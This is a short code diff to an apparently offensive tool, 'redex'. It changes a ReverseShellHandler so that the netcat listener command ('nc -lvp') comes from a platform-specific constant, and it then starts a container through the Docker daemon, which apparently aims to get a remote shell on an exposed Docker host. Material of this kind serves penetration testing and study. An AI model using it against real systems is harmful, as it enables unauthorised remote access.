@@ -1,8 +1,10 @@
 import requests
 import rich
 import subprocess
+import sys
 
 from redex.utils.thread import Threading
+from redex.utils.constants import REVSHELL_CLIENT_COMMAND
 from typing import Dict
 
 
@@ -54,7 +56,10 @@ class ReverseShellHandler(object):
             # Start NETCAT on listening mode
             remote_shell_process = Threading.run_single_thread(
                 function=subprocess.run,
-                args=(['/bin/bash', '-c', f'nc -lvp {self.lport}'])
+                args=([
+                    '/bin/bash', '-c', 
+                    REVSHELL_CLIENT_COMMAND[sys.platform] % self.lport
+                ])
             )
 
             # Make the request to the docker daemon to start a new container
